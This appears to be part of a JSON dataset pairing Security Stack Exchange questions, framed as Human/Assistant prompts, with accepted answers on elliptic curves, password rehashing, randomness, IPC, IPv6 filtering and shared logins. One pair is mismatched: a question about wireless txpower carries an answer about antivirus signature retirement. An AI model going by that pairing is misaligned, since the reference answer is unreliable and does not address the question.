credibility</h3>\n\n<ul>\n<li><p><em>Custom flash drive</em>: A quick search let me find several open sourced USB keys with customizable firmware already available in retail and wholesale, however they were targeting the more profitable market of security tokens which mean they add a more costly cryptographic hardware to the key. Most chances are that cheaper already-made USB keys can be found at lower price.</p></li>\n<li><p><em>Custom firmware</em>: Creating his own firmware may sound highly technical, but I do not think it really is. USB chips provider also provide the associated development framework which include libraries acting as an abstraction level over USB low-level operations and placeholders for the user's customized code. As a sample <a href=\"http://ww1.microchip.com/downloads/en/DeviceDoc/51679b.pdf\" rel=\"nofollow noreferrer\">here is a random documentation</a> for such a library so you can get yourself an idea. The main prerequisites are to know how to write C applications, how to use an IDE, and have only a basic understanding of how USB works.</p></li>\n<li><p><em>Divide the storage area and control access to each zone</em>: This is not my invention, as far as I remember this is how the <a href=\"https://en.wikipedia.org/wiki/Secure_Digital#DRM_copy-protection\" rel=\"nofollow noreferrer\">DRM extension for SD cards</a> is implemented. To learn more on this topic, this specification is confidential however some part of it (at least) leaked on the Internet despite the non-disclosure agreements. I am not reinventing the wheel.</p></li>\n<li><p><em>On-the-fly encryption</em>: There are already USB token providing on-the-fly encryption, however to achieve good performance they bundle some cryptographic hardware. Since encryption is not your first goal here, and if you really need to encrypt the storage area (ie. if you fear that your users will take your flash disks apart and access the raw NAND chips content directly), you may still be able to do without such hardware but you will have to restrain yourself to very low resources algorithms. In fact, with a flash drive limited computing resources, you may go more toward some data obfuscation scheme than a true highly secure encryption algorithm.</p></li>\n</ul>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Recent developments have cast <a href=\"https://crypto.stackexchange.com/questions/10263/should-we-trust-the-nist-recommended-ecc-parameters\">some</a> <a href=\"https://www.schneier.com/blog/archives/2013/09/the_nsa_is_brea.html#c1675929\" rel=\"nofollow noreferrer\">doubt</a> on the elliptic curves specified by NIST and used in many standards like TLS (for signatures with ECDSA and key agreement with ECDHE).</p>\n<p>It seems like the standard <a href=\"https://www.rfc-editor.org/rfc/rfc4492#section-5.1.1\" rel=\"nofollow noreferrer\">allows for custom</a>, server-generated ECDH-curves that are transmitted during the handshake (just <a href=\"https://www.rfc-editor.org/rfc/rfc5246#section-7.4.3\" rel=\"nofollow noreferrer\">like with non-elliptic DH</a>).</p>\n<ul>\n<li><p>Do common implementations actually support that, or are they restricted to the NIST-specified curves? I've traced TLS handshakes with Google Chrome and iOS; it seems like the elliptic_curves extension only specifies the curves <code>secp{256,384,521}r1</code>, and not <code>arbitrary_explicit_{prime,char2}_curves</code>.</p>\n</li>\n<li><p>What is the situation for elliptic curve certificates? TLS seems to require X.509 certificates complying to RFC3279 or any RFC that replaces it (which would be RFC5480). According to <a href=\"https://www.rfc-editor.org/rfc/rfc3279\" rel=\"nofollow noreferrer\">RFC3279</a>, it's possible; in <a href=\"https://www.rfc-editor.org/rfc/rfc5480\" rel=\"nofollow noreferrer\">RFC5480</a>, explicit or implicit curves are <a href=\"https://www.rfc-editor.org/rfc/rfc5480#section-2\" rel=\"nofollow noreferrer\">specifically excluded</a>.</p>\n</li>\n</ul>\n<p>In general, to what extent are custom elliptic curves permitted by today's standards (TLS, S/MIME etc.) and supported by the various implementations (OpenSSL, NSS, proprietary ones)?</p>\n<p>If they are not supported: Why? Is it more difficult to find &quot;good&quot; curves than to find suitable DH parameters? Are common curves easier to verify and/or implement? Are they faster?</p>\n\n\nAssistant:",
        "golden_answer": " <p>The NIST has &quot;defined&quot; 15 &quot;standard curves&quot;, specified in <a href=\"http://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.186-4.pdf\" rel=\"nofollow noreferrer\">FIPS 186-4</a>. Actually, they did not define them themselves; they inherited them from <a href=\"http://www.secg.org/collateral/sec2_final.pdf\" rel=\"nofollow noreferrer\">SEC</a>. These 15 curves aggregate into 3 groups:</p>\n<ul>\n<li>The P-* curves work in a &quot;prime field&quot; (point coordinates are integers modulo a prime <em>p</em>).</li>\n<li>The B-* curves work in a &quot;binary field&quot; (point coordinates are values in <em>GF(2<sup>m</sup>)</em>).</li>\n<li>The K-* curves work in the same fields as the B-* curves, but have a special structure which allows for faster computations.</li>\n</ul>\n<p>NIST found out that there was a huge reluctance to implement support for these 15 curves, let alone for &quot;general&quot; curves, for a variety of reasons:</p>\n<ul>\n<li>The involved mathematics are felt to be &quot;hard&quot; (that's harder to grasp than RSA or plain Diffie-Hellman).</li>\n<li>... even more so for curves in binary fields.</li>\n<li>While it is possible to write &quot;generic&quot; curve-handling code, code which targets a specific curve is often simpler to implement and faster. In particular, the P-* curves work modulo prime values whose format makes implementation more efficient (fast modular reduction).</li>\n<li>There have been recurrent and long-standing claims of <a href=\"http://en.wikipedia.org/wiki/ECC_patents\" rel=\"nofollow noreferrer\">patents</a>, making the use of elliptic curve &quot;risky&quot;.</li>\n<li>... especially for curves in binary fields;</li>\n<li>... and more generally for generic curves chosen to have some characteristic which is beneficial to implementation. It is not known whether a <em>curve</em> can be patented (as opposed to <em>an implementation technique</em> supported by a special curve structure), but uncertainty already does powerful dissuasion.</li>\n</ul>\n<p>Thus, people were wary of implementing generic support for elliptic curves, because it seemed to be hard, detrimental to performance, and a legal minefield. Sticking to a few of the simpler curves seemed easier, faster and safer; and that's what happened. NIST (well, NSA) formalized this trend as their &quot;<a href=\"http://en.wikipedia.org/wiki/NSA_Suite_B_Cryptography\" rel=\"nofollow noreferrer\">suite B</a>&quot; cryptography suite, which mandates implementation of exactly two curves: P-256 and P-384.</p>\n<p>In SSL/TLS and in X.509, arbitrary curves may be used. However, most implementations won't support arbitrary curves. OpenSSL supports all 15 NIST curves, but not arbitrary curves. Firefox supports only P-256 and P-384; I am not sure Microsoft's code (Windows, hence Internet Explorer) will accept more than that either (maybe P-521 as well). If you try to use any other curve than P-256 or P-384, then you will encounter interoperability issues (more issues than what you already get by trying to use elliptic curves at all). Some standard writers, feeling that they must &quot;be practical&quot;, have fully admitted this fact, and just banned the use of other curves, as you see in <a href=\"https://www.rfc-editor.org/rfc/rfc5480\" rel=\"nofollow noreferrer\">RFC 5480</a>.</p>\n<hr />\n<p>Generating your own curve is not hard, but substantially harder than generating your own DH parameters. It involves point counting with <a href=\"http://en.wikipedia.org/wiki/Schoof%27s_algorithm\" rel=\"nofollow noreferrer\">Schoof's algorithm</a> or a variant thereof. You won't be able to slap together a curve generator in one hour and a hundred lines of Java code, whereas producing DH parameters can be done under these constraints. The computational cost is also higher (you will still get a nice curve in a minute, but not in 100ms). To be brief, people don't do that often, or at all.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I am building an application that requires secure data transfer. In particular, the sender has a data file that needs to be sent to the receiver. It is required that only the receiver be able to read the data. It is also required that the receiver can know for sure that the data comes from the sender.</p>\n\n<p>The sender and receiver have a long-term business relationship, and will have exchanged public keys. The data files to be transmitted are not small.</p>\n\n<p>I am assuming that Bouncy Castle is a good route to go, but I am open to other suggestions.</p>\n\n<p>I have read all the BC documentation I can find (none) and look at the API and some examples I found on the internet. It appears that I want to be using <code>CMSEnvelopedDataGenerator</code>, but I have some specific questions:</p>\n\n<ol>\n<li>Exactly how do I configure the data encryption (presumably using AES)?</li>\n<li>Exactly how do I configure the double-signing (using sender's private key and receiver's public key)?</li>\n<li>Can I configure it so that the data is zipped/compressed before being encrypted?</li>\n<li>Is the BC implementation of this scenario secure and safe to use? Are there specific settings/algorithms/parameters that are required to make it secure?</li>\n<li>Is there an available 3rd-party, standalone application that I can use to read/validate that the BC output is indeed correct and secure?</li>\n<li>What else should I be asking (I am a crypto newbie)? Or is there a better way to do what I am looking for?</li>\n</ol>\n\n<p><strong>Follow-up question</strong>\nIn doing further research, I ran across this <a href=\"http://static.usenix.org/publications/library/proceedings/usenix01/full_papers/davis/davis_html/index.html\" rel=\"nofollow\">article</a>. My requirements are such that I need to not be susceptible to surreptitious forwarding. The article is old. Do the various \"secure\" technologies still suffer from the mentioned faults? Do any of the standard products/libraries provide a secure solution in a standard way?</p>\n\n\nAssistant:",
        "golden_answer": " <p>The BouncyCastle <a href=\"http://www.bouncycastle.org/docs/pgdocs1.5on/index.html\" rel=\"nofollow\">OpenPGP</a> or <a href=\"http://www.bouncycastle.org/docs/mdocs1.5on/index.html\" rel=\"nofollow\">S/MIME</a> packages should allow you to do what you want. OpenPGP will be more appropriate when using OpenPGP certificates (often only referred to as \"PGP public keys\"), whereas S/MIME will be more appropriate when using X.509 certificates.</p>\n\n<p>There's no \"double-signing\" involved: you'll <em>sign</em> with the sender's private key and <em>encrypt</em> with the recipient's public key.</p>\n\n<p>GnuPG (or other implementations of OpenPGP) should allow you to test the results if you use BouncyCastle's OpenPGP implementation.</p>\n\n<p>Note that you should sign first and encrypt afterwards, not the other way around, on the basis that the signer should be able to look at what it signs, and the recipient to be able to decipher and read, but keep the signature attached if necessary.</p>\n\n<p>There doesn't seem to be many BouncyCastle OpenPGP examples around, but <a href=\"http://sloanseaman.com/wordpress/2012/05/13/revisited-pgp-encryptiondecryption-in-java/\" rel=\"nofollow\">this blog entry</a> looks rather complete (although I'd still sign first and encrypt afterwards). Compression is also taken into account.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>For a long time hash functions have required a work-factor in order to keep the operation \"slow\" enough to protect individual passwords in the case of a database leak.  Bcrypt and PBKDF2 being notable examples.</p>\n\n<p>I'm also aware of the \"Don't Roll Your Own\" when it comes to security, but it's easy to imagine a situation that over time the work factor of your password hashing scheme becomes too quick because of hardware increases.  One could also imagine a situation where the owners of the database upgrade their own hardware and thus a higher work-factor is suitable compared to what was being used before the hardware upgrade to ensure better safety per-password.</p>\n\n<p>The problem comes with having to \"re-hash\" a password, because you don't want to store a plaintext or even an encrypted password in a database so the system has no way to access the password again for rehashing to change the work factor.  To fix this, simply do this re-hashing when a user logs in.  Whenever the user logs in their plaintext password is already available to the system, on a successful hash verification of the password the system can check the previous work-factor associated with the hash of the password (easy to do in bcrypt) and if it is less than the standard work-factor selected by the system operators then the plaintext password is rehashed and stored with the new work-factor and new salt.  Sessions don't need to be reset as the same password is being used as before, just a different work-factor and salt.</p>\n\n<p>Apart from the plaintext password being in memory for slightly longer during the verification of the password and an increased time in verifying the password whenever a work-factor increase is issued, I can't find any faults of this model. Are there any security flaws that I have missed? </p>\n\n\nAssistant:",
        "golden_answer": " <p>You seem to have summed it up pretty well.</p>\n<p>The only drawback I can think of is inactive users in your system - they will continue to have a previous work factor because they may never log in again, or may not have chance to log in before your next breach, meaning their stored password is more vulnerable to attack. As work factor is visible within the stored data, the attacker would know which ones are using the old setting (although they will not know the relative entropy within each password).</p>\n<p>To prevent this, you could regularly disable accounts that have not been logged into for say 6 months, blanking their password at the same time. If they need to login at a future time, they can simply go through your <a href=\"https://security.stackexchange.com/a/117871/8340\">forgotten password functionality</a> to enable a new password to be set and stored with the new work factor.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I stumbled upon a guide which says increase txpower by setting region to some place. So my doubt is\n1.What does txpower means?\n2.What if if increased txpower will there be any trouble?\nI am saying txpower of my wireless adapter.</p>\n\n\nAssistant:",
        "golden_answer": " <p>Antivirus vendors and administrators tend to disable scanning routines and pattern detection for older malware generations. They usually do this for performance reasons. The legitimization is, that old malware might be eliminated anyway in the meanwhile because there were so many detection mechanisms established for so long which would make it impossible for an ancient malware to survive. I did an <a href=\"https://www.scip.ch/en/?labs.20131211\" rel=\"nofollow noreferrer\">analysis of the default protection filters of HP TippingPoint</a> and revealed the same in the IDS/IPS sector.</p>\n\n<p>The problem is, that the reasoning is wrong. Older malware might have survived because everyone thought it is extinct. There is a similar problem when it comes to vaccination.</p>\n\n<p>Besides that it might be possible that an attacker/malware manipulated the timestamps of a file. Without integrity checking you can't tell if this really is the file that you expect it to be since an earlier point in time.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Proper security algorithms demand <em>true</em> random numbers. For instance, secret keys &amp; initialization vectors should never not be true random.</p>\n<p>However, generating numbers using Java's <code>Random</code> library or C's <code>srand()</code> initialization &amp; then <code>rand()</code> are only able to generate <em>pseudorandom</em> numbers. From what I understand, since functions like <code>srand()</code> gather the seed from some source such as system time, and the 24 hours time is cyclical, it is not truly random. Please correct me if this assumption is flawed.</p>\n<p>Also, an example of a truly random number would be if we use a seed from let's say an audio file, and picked a <strong>pseudorandom</strong> place in the file and then get the audio frequency at that location. Since only the location was pseudorandom but the frequency at that location was not, the value is truly random. Please correct me if this assumption is flawed.</p>\n<p>Finally, apologies for compounding the question further, exactly how vulnerable would it really leave systems if pseudorandom values are used? I have learned that AES 128 is actually enough to secure systems (<a href=\"https://crypto.stackexchange.com/questions/77000/is-128-bit-security-still-considered-strong-in-2020-within-the-context-of-both\">Is 128-bit security still considered strong in 2020, within the context of both ECC Asym &amp; Sym ciphers?</a>). For military standards, 192 &amp; 256 were adopted  (<a href=\"https://security.stackexchange.com/questions/14068/why-most-people-use-256-bit-encryption-instead-of-128-bit\">Why most people use 256 bit encryption instead of 128 bit?</a>). Is using true random values also akin to following such baseless standards, or is it actually crucial?</p>\n\n\nAssistant:",
        "golden_answer": " <p>There is a (common) misconception in this question that there is such a thing as “true” randomness and that this matters for security. In fact, whether “true” randomness exists is a philosophical question (physics gives a partial answer), which is not relevant for security.</p>\n<p>There are many notions of randomness. What is relevant for security is <em><strong>unpredictability</strong></em>. Security is defined as protecting against adversaries. A value is “random”, for security purposes, if your adversary cannot find or guess it.</p>\n<p>In the context of security, “true random” is sometimes used to mean a value is based on some physical process that no adversary can reproduce. For example, a coin flip is generally truly random in that sense. But not if the coin is too heavily biased, and not if the adversary can see the result of the coin flip. Performing 128 coin flips in front of a camera will not give you a secure 128-bit random number. (It does give you a value that cannot be predicted in advance, which is good for a few things but not good, for example, as a cryptographic key.)</p>\n<p>Conversely, a value which is calculated in a deterministic way by a <a href=\"https://en.wikipedia.org/wiki/Cryptographically-secure_pseudorandom_number_generator\" rel=\"noreferrer\">cryptographically secure pseudorandom generator</a> (CSPRNG) is perfectly fine as a random value, as long as adversaries cannot learn the seed or the internal state of the random generator. The fact that only deterministic physical processes were involved other than the generation of the seed, and that the same seed was used to generate other random values, do not compromise the security of the random value (assuming that the CSPRNG was correctly designed and implemented — an assumption that holds for any secure processing).</p>\n<p>“True” randomness is necessary for security because you have to seed the CSPRNG somehow. You can seed a CSPRNG with the output of a CSPRNG, but ultimately, you have to start somewhere with a non-deterministic or non-sufficiently-precisely-modeled physical process.</p>\n<p>A random value is only good enough if it's <em>sufficiently</em> unpredictable. If I tell you that I picked my secret key at random between <code>12729af5a51075a68db9d4b05ce7981a</code> and <code>fc42099f25ee1eb5a8dc1178c35868b8</code>, that's not good for me: I did in fact generate those two values randomly, and you don't know which one it is, but you can still find it in at most two guesses. The measure of unpredictability or unknownability of a value is called <em><a href=\"https://en.wikipedia.org/wiki/Entropy_(information_theory)\" rel=\"noreferrer\">entropy</a></em> (beware that there are many related, but distinct concepts called <a href=\"https://en.wikipedia.org/wiki/Entropy_(disambiguation)\" rel=\"noreferrer\">entropy</a>). A fully known value has an entropy of 0. A value which has equal chances of being one of two known possibilities has an entropy of 1. By telling you that my key is one of these two values, I've reduced its entropy to at most 1 bit, no matter how randomly those two values were generated.</p>\n<p>An audio file may or may not have a large amount of entropy. At one extreme, if the adversary has the same file, the entropy is 0. If the adversary has a different recording of the same sound, there may be artifacts due to the microphone quality and placement, but audio compression would tend to remove these artifacts. Microphone white noise can be a decent source of entropy, but you should get it directly from the hardware: by the time you get a recording, it's hard to make sure that the noise has been preserved and that the same noise hasn't been copied somewhere else.</p>\n<p>The problem with <code>rand()</code> functions in the standard library of most programming languages is not that they're pseudorandom, but that they're not cryptographically secure for two major reasons:</p>\n<ul>\n<li>The adversary can find the seed. For example <code>srand(time())</code> is mostly predictable (depending on how precisely the adversary knows when your application ran – this has nothing to do with time-of-day being cyclical). And even if the adversary doesn't know the seed, if the seed is a 32-bit number, it's easy for the adversary to try all possible seeds by brute force. If it's a 64-bit number, it's costly but still doable.</li>\n<li>Outputs are not independent: given enough outputs from <code>rand()</code>, it's possible to calculate other outputs.</li>\n</ul>\n<p>Secure random generators, such as <code>/dev/urandom</code> or <code>CryptGenRandom</code>, have neither of these flaws: they use a CSPRNG algorithm (which guarantees independent outputs) from a secure seed (which, in modern computers, can be generated from a component in the main CPU).</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I'm writing a software which is divided into two separate stand-alone pieces. One is a service like application that handles all the logics, the other one is a GUI application that just works as a front-end and is aimed to be used by the end user. The service would listen to a port and accept requests from the client (GUI) application.</p>\n\n<p>Since some sensitive information is exchanged between the service and the GUI applications, they need to be encrypted before getting transferred. One way to secure data is to use a key based encryption but keys need to be stored somewhere on the disk or even in the application's source code, but would rather avoid using keys.</p>\n\n<p>How can I handle a secure connection between service and GUI application without using a key-based encryption algorithm?</p>\n\n\nAssistant:",
        "golden_answer": " <p>These are the golden rule of computer security: \"It is impossible to hide anything from a competent user with system administrator privilege\" and \"any competent user with physical access to the device can always elevate himself to system administrator\".</p>\n\n<p>You cannot hide any information from someone with physical control of the machine. If the secret you are trying to hide is really important, then you should never transfer the data to the machine and do your processing elsewhere in a place that you control.</p>\n\n<p>Your program is running on a user's machine. You cannot protect your data from the user. With that in mind, does this mean we're doomed? Not necessarily. The operating system provides a wealth of mechanism for programs to communicate privately with another program that will not allow another unprivileged application to intercept it. So, while you cannot protect any data from the user themselves, you can protect your data from another unprivileged program. Providing security boundary between unprivileged programs is one of the main job of the operating systems.</p>\n\n<p>The simplest of this is an anonymous pipe. A pipe allow a unidirectional stream of data to be transported between program. Anonymous pipe is available in Windows, Linux, OSX, and all Unix-like systems. Anonymous pipe most commonly recognized as a pair of pipe called stdin and stdout that allows a parent process to send and receive a stream of data to and from its children. Anonymous pipe can only be used between processes that have parent and child relationship. There is also a named pipe, but they behave differently in Windows and in Linux/Unix-like systems, we will get back to this later.</p>\n\n<p>Another IPC that are commonly available is sockets. Sockets is like a bidirectional pipe. There are many different sockets but they work similarly. The most commonly known is TCP socket. TCP socket is primarily intended for networking between machines but you can also create a loopback TCP socket which can only be used within the same machine. A loopback socket provides privacy (only the program the program that connects and the program that listens can read the data passing through the socket), however it does not really provide mechanism to restrict who can be the other side of the socket.</p>\n\n<p>Another type of socket available in Unix for communication between processes in the same machine is Unix Domain Socket. A Unix domain socket is exposed to programs as a \"special file\" in the filesystem, and unix filesystem permission is used to control access to the socket. A domain socket cannot be connected to by programs that does not have the right access permission to access the socket file. In Unix-like systems, this means that your service and GUI should run as the same user and/or group that are reserved only for your program and you set the socket file permission appropriately.</p>\n\n<p>Let's get back to named pipe. In Linux/Unix-like systems, a named pipe is pretty much like stdin/stdout in that they are unidirectional. In Windows, however, a named pipe is actually bidirectional and is pretty much the equivalent of Unix domain socket in Windows. Like a lot of things in Windows, named pipe is secured with ACL.</p>\n\n<p>With iOS things becomes a bit hairy. A non-jailbroken iOS only allows a <em>very</em> limited set of inter-process communication, and neither will give you a socket. But if we play loose with definition, in the iOS application, the service program and the GUI program is probably going to actually be the same application, and thus you can simply create a stream directly between different components of the application. This is also secure as the stream is accessible only within the application.</p>\n\n<p>Android provides more options for IPC, including the ability to create domain socket. The API is different but they are conceptually similar with regular Linux. Alternatively, you may go the same approach like in iOS and package your service and GUI in the same application and just use in-process streams.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I am working on a website and would like to have it under revision control. I have used git for earlier projects before and I like it. This project though is a website written in Django. I am totally for open source, but I am wondering if it would be a bad idea to leave the source code for the website public, so that someone with bad intentions could search the repository for security holes?</p>\n\n<p>Of course I am not going to upload stuff that should be kept secret passwords, etc.</p>\n\n<p>The site is going to be a webpage for a local sports club, so I guess that the security for the site don't have to be as high as for example an online shop. </p>\n\n<p>So my question is, is it a bad idea to have a public repository for a Django website, or is it acceptable if I don't add the sensitive information?</p>\n\n<p>I took a look at the thread <a href=\"https://security.stackexchange.com/questions/4441/open-source-vs-closed-source-systems\">Open Source vs Closed Source Systems</a> discussing the same topic, but it rather discusses open source vs. closed source from a security point of view in general. Interesting discussion, however not enough for me to make a decision. In the thread a few people point out that it matters what kind of project you are working on. Could you give me some recommendations for my project with the following specifications.</p>\n\n<ul>\n<li>Small webpage for local sport club.</li>\n<li>No on-site payments.</li>\n<li>No sensitive information in general except if someone would use same user information as for an other site.</li>\n<li>One person developing (me), might be a few more.</li>\n</ul>\n\n<p>What I have found out so far:</p>\n\n<p>Pro open source</p>\n\n<ul>\n<li>I am probably going to write better code if I know that it might be read by others.</li>\n<li>If someone sees a bug they'll hopefully inform me.</li>\n<li>Hackers know the common security holes anyway.</li>\n<li>There is no or very small interest (profit) in hacking my site.</li>\n<li>Contributing to the open source community.</li>\n</ul>\n\n<p>Pro closed source</p>\n\n<ul>\n<li>Security through obscurity => another layer of security.</li>\n<li>If I or someone else working on the site would commit sensitive credentials by mistake.</li>\n<li>Project is exposed because it will be directly accessible over the internet.</li>\n</ul>\n\n\nAssistant:",
        "golden_answer": " <p>If your website is secure, even the source code wouldn't help an attacker in a perfect world. But we do not live in this world.</p>\n\n<p>By making the source code public you are simultaneously holding yourself to a higher standard coding wise, and introducing more risk. Since you're giving away your code to anybody who asks, you'd better make it rock-solid. (In fact, you should be doing this anyway, but I'm sure you know that!)</p>\n\n<p>Releasing your source will allow for good, helpful people to point out bad things, and it gives a motivation for you to write solid code at all times. I'd say it's a good idea. However, you should talk about the risk with the website owner. Private repos do exist on GitHub and you can stand up your own Git server/local Git repo for private version control.</p>\n\n<p>Suggested Reading:</p>\n\n<ul>\n<li><a href=\"https://en.wikipedia.org/wiki/Open-source_software_security#The_implementation_debate\">Pros and Cons of Open Source implementation</a></li>\n<li><a href=\"https://en.wikipedia.org/wiki/Kerckhoffs%27s_principle\">Kerckhoffs's principle</a></li>\n</ul>\n"
    },
    {
        "prompt": "\n\nHuman: <p>In the next months/years my ISP might give me IPv6 for my home connection. But what are the security implications? Will local network servers/embedded devices be accessible from the whole internet?</p>\n\n<p>In IPv4 you were protected by the NAT. Many services and embedded devices like network printers have a local adress but listen to any incoming connection (0.0.0.0 at IPv4). If they should be reachable from the internet, port forwarding or upnp were your options (including some infamous security cameras beeing accessible via upnp without password by default from the internet).</p>\n\n<p>When my ISP switches me to IPv6 are those accessible from the internet/do I need to create firewall rules on my home router (similar to port forwarding)/will there be something like UPnP for programms like bittorrent? Are there other security considerations? Will it end like this <a href=\"https://serverfault.com/questions/766890/network-printer-exploited-read-hacked-to-print-antisemitic-documents-how-to\">https://serverfault.com/questions/766890/network-printer-exploited-read-hacked-to-print-antisemitic-documents-how-to</a> ?</p>\n\n<p>If this is model/ISP specific, feel free to assume a common configuration (preferable in central Europe).</p>\n\n\nAssistant:",
        "golden_answer": " <p>With IPv6 you cannot rely on NAT, and thus, yes, you have to configure reasonable packet filtering rules on the router or firewall. For stateful filters this is easy to accomplish: Allow all outgoing traffic and allow all incoming traffic that is related to the outgoing traffic, drop anything else. For stateless filters there's a bit more to do, in particular, you have to bear in mind that IPv6 requires several ICMPv6 packet types for its operation (mostly error messages; for instance, \"packet too big\" messages since with IPv6 routers don't fragment as they do with IP legacy).</p>\n\n<p>Without NAT you don't need port forwarding, you simply add the according filter rule for incoming traffic.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Most of the time when we develop a software flow to implement a business logic often we are giving some decision that effecting safe and comfortable usage of the system and maybe success of the business.</p>\n\n<p>For example to validate a member that is trying to update important data on the system (like credit card data etc.) we may decide to ask confirmation by SMS with OTP. So we may send 4 digit code and ask for confirmation. But first of all how can we sure that OTP over SMS is secure enough for our process? How long OTP we should send, 4 digit enough? Is it enough secure to use only numbers instead of letters too? We are of course always trying to make it easy for members so it will be comfortable to them and not to decide stop using our systems. Otherwise we may do it as hard as we can so it would be more secure.</p>\n\n<p>Of course this is not a specific question and answer would not be clear on this but I am asking this question to understand if there is methodology or statistical method to decide business process or software flow statistically secure? Because mostly we are deciding according to ours and some of the colleagues opinion nothing else which is not measurable. There must be a way to handle such questions?</p>\n\n<p>So any idea?</p>\n\n\nAssistant:",
        "golden_answer": " <p>Basically you need to perform a Risk Assessment, and the company needs to define their limits. </p>\n\n<p><a href=\"https://en.wikipedia.org/wiki/Risk_assessment\" rel=\"nofollow\">Risk assessment</a></p>\n\n<p>Is performed to identify risk to a company. In Information Security these risks come in the forms of breechs/ social engineering /etc. Risk has a defined description which is</p>\n\n<p>Risk = Potential Loss X Probability that something will happen</p>\n\n<p>Risk assessment use two form of was to apply value to an assessment.</p>\n\n<p><a href=\"https://en.wikipedia.org/wiki/Quantity\" rel=\"nofollow\">Quantitative</a> </p>\n\n<p>Quantitative is an assessment of value which typically numeric value to it. You could for instance measure the numeric value of your incoming data lines and compare it to the losses your company would suffer (in terms of dollars) if those line we're to go down</p>\n\n<p><a href=\"https://en.wikipedia.org/wiki/Qualitative_property\" rel=\"nofollow\">Qualitative</a> </p>\n\n<p>Qualitative is an assessment of value which can't be typically measured in numeric forms. For example, how easy would it be for an attacker to Social Engineer his way into change account information.</p>\n\n<p>As some words of advice, if you have never done a risk assessment before, I would highly recommend you hire a company to do a small assessment with you. There is a lot that can go into these and while the internet has great resources on what it is and what you are trying to accomplish with it. It's kind of all over the map on executing one. Learn how someone else does it, see what goes into it, and than take that knowledge and improve upon it.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>What are the security risks of encouraging, supporting and allowing shared logins to our website (username / password)?</p>\n\n<p>This feature would allow some number of users, normally working for the same organization, to all use a single login to the website and perform the same functions as that login with no further identifying info.</p>\n\n<p>Several users and some of the business stakeholders are asking that we support and encourage shared logins to one of our new websites. I have no idea why they are asking for this yet. The website does not have anything to do with the health industry and no financial information will be tracked in it.</p>\n\n<p>There are immediately some architecture and UX problems I have with this 'feature' but I am looking for any security risks/concerns to back up my other gripes.</p>\n\n\nAssistant:",
        "golden_answer": " <p>Concerns regarding shared accounts:</p>\n\n<ol>\n<li><p>The audit trail becomes an issue, since there is no valid audit trail possible. When the audit trail is not properly in place, accountability becomes an issue.</p></li>\n<li><p>Loss of credentials to unauthorized users is significantly increased.</p></li>\n<li><p>Once an account is compromised, the impact is high since many users share the same account.</p></li>\n<li><p>Password policies no longer apply. Regularly changing passwords is not a viable option anymore. If the password would regularly be changed, how is the new password communicated to all your users?</p></li>\n</ol>\n\n<p>Probably one could come up with a few more concerns here. The fact that you do not understand why they are asking you this question is interesting to me.</p>\n\n<p>Apparently they have an issue and think they have the best solution for this problem already and ask you to implement it this way.</p>\n\n<p>I personally would go back to them and try to determine the problem. Once the problem is determined, a proper and secure solution could be considered.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Is it the same as DHCP exhaustion? Can LANs be vulnerable to such attacks or it's against WiFi only? </p>\n\n\nAssistant:",
        "golden_answer": " <p>Well Wifi or 802.11 is a protocol used at layers 1 and 2. DHCP works on layer 7 and uses a broadcast message to the whole network to which any DHCP server will/may reply to. So it's not only related to wifi it's, as Rory mentioned, applicable to any network using DHCP. </p>\n\n<p>It's indeed the same as DHCP exhaustion. You as an attacker, will be sending tons of DHCP requests with spoofed MAC addresses to the DHCP server as to deplete the pool available IP addresses.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I have a webpage (HTTPS encrypted and authorized only via domain credentials) that displays grid information. This grid information is received via a POST request to my server which will send  back all of the pertinent information in JSON format.  </p>\n\n<p>My javascript code is obfuscated, but all the return data is easily viewable via the network tab of Chrome's developments tools, by finding the POST request response (which is quite large and easily spotted).</p>\n\n<p>Now, although everything is secure, so this information can only be retrieved by valid users, I do not want them to be able to be able to view the entire data block that is returned.</p>\n\n<p>Are there better ways of returning data that cannot easily be extracted by Chrome's network development tools? Or am I basically looking at implementing another level of encryption on the JSON data itself, and only decrypting the data locally when I choose to display parts of it?</p>\n\n\nAssistant:",
        "golden_answer": " <p>From a <strong>security perspective</strong> the answer is to never send anything you don't want the user to know to any system the user controls. </p>\n\n<p>From a <strong>UX perspective</strong>, having a bunch of extra data that's only visible if they open developer tools shouldn't be a problem. Anything they see in developer tools isn't \"user experience\", it's <em>developer</em> experience. Having stuff encrypted or encoded just makes the \"developer experience\" worse.</p>\n\n<p>From a <strong>performance perspective</strong>, having multiple, or many, or uncachable, GET requests usually isn't a huge problem. The details depend a lot of your tech stack and your end-users' situations, but typically you can mitigate related performance problems by</p>\n\n<ul>\n<li>Looking at your caching situation. Don't go overboard, but, counting the user's browser-cache, caching at two or three levels of the tech stack may be appropriate. Particularly, your server could cache a broad DB query, and then perform filtering before sending the data to the client.</li>\n<li>Tune your server. This is a massive rabbit-hole; the specific thing I'm suggesting is that you make sure HTTPS connections are being kept open for a little while. 30 seconds or so is often good. That will speed up HTTPS <em>requests</em> that happen while the connection is still alive.</li>\n<li>Batch requests. Either let the client request large <em>lists</em> of <em>specific</em> resources in a single request, or move (even duplicate) the logic that would determine what followup resources are going to be needed from the client to the server. You could also look into using <a href=\"https://en.wikipedia.org/wiki/HTTP/2_Server_Push\" rel=\"nofollow noreferrer\">HTTP/2 Server Push</a>.</li>\n<li><em>As a last resort</em>, just buy a more powerful system. It won't make an unworkable solution workable, and it'll feel like a cop-out. But it can make a sluggish system feel performant, and it will handle larger traffic spikes without hanging.</li>\n</ul>\n"
    },
    {
